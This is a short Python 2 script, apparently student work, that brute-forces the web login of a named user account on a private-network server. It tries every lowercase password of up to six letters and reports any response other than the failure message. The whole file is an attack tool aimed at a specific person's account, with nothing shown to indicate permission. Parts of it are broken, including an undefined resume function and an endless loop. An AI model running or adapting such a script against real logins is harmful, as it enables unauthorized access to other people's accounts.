"""
Brute-force a log-in the hard way, using wordlist by generate_brute.py

Made by Leander Thorkildsen and Theodor Fossum.
"""

import os
import requests
import sys
import getopt
import itertools
import time



def usage():
    print("\nCommand Line Arguments:")
    print("    -n    Number of letters (wordlist)")
    print("    -h    Display this message")
    print("\n")



def make_request(password):
    #print password
    r = requests.post("http://10.225.147.176/~sigurdkb/action.php?ulogin=sigurdkb&upass="+password+"&action=login&submit=Log+In")
    while r.text is "":
        print "empty"
    if r.text != "Error: Incorrect login or password.":
        print "Correct password:", password
        print "Text:", r.text
        #sys.exit(1)



def make_request_med_tall(password):
    #print password
    for j in range(0, 100):
        password_tall = password + str(j)
        make_request(password_tall)
    password_tall = password + str(123)
    make_request(password_tall)


def save_progress(progress):
    f = open("saved_progress.txt", "a")
    f.write("{}\n".format(progress))
    f.close()
    


def brute(antall):
    charset = "abcdefghijklmnopqrstuvwxyz"
    charset_reverse = "zyxwvutsrqponmlkjihgfedcba"
    printer = 0
    delay = 0
    timer = time.time()
    progress = 0
    for i in range(1, 7):
        for attempt in itertools.product(charset, repeat=i):
            password = "".join(attempt)
            make_request(password)
            printer = printer + 1
            if printer > 1000:
                delay = time.time() - timer
                speed = int(1000/delay)
                print "Trying", password, "with", speed, "passwords per second"
                #print password
                printer = 0
                timer = time.time()
                save_progress(progress)





if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'h:n:')
    except getopt.GetoptError:
        usage()
        sys.exit(1)


    # default
    antall = 1
    saved = False


    for opt, arg in opts:
        if opt in ("-h"):
            usage()
            sys.exit(1)
        elif opt in ("-n"):
            antall = arg
        elif opt in ("-s"):
            saved = True
        else:
            print("Invalid argument {}".format(opt))

    try:
        if saved:
            brute_from_saved(antall)
        else:
            brute(antall)
    except Exception as e:
        print "Oh no, something went wrong."
        print(e)
        usage()
        sys.exit(1)

